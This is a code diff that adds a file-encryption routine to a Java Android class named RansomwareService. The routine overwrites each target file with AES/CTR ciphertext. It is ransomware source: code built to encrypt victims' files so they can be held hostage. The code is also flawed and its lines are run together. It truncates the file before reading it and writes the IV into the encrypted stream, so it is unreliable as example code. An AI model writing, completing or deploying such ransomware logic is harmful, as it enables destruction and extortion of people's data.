@@ -54,4 +54,11 @@ public class RansomwareService extends Service {    private static final String 
                 }            }
         }    }
     private void encryptFile(File file, SecretKey secretKey) throws NoSuchAlgorithmException, NoSuchPaddingException, IOException {
-        Cipher cipher = Cipher.getInstance("AES/CTR/NoPadding");        cipher.init(Cipher.ENCRYPT_MODE,
+        Cipher cipher = Cipher.getInstance("AES/CTR/NoPadding");        cipher.init(Cipher.ENCRYPT_MODE,secretKey);
+        FileInputStream inputStream = new FileInputStream(file);        byte[] iv = cipher.getIV();
+        FileOutputStream outputStream = new FileOutputStream(file);        CipherOutputStream cipherOutputStream = new CipherOutputStream(outputStream, cipher);
+        byte[] buffer = new byte[4096];        int bytesRead;
+        while ((bytesRead = inputStream.read(buffer)) != -1) {            cipherOutputStream.write(buffer, 0, bytesRead);
+        }        cipherOutputStream.write(iv);
+        cipherOutputStream.close();    }
+}
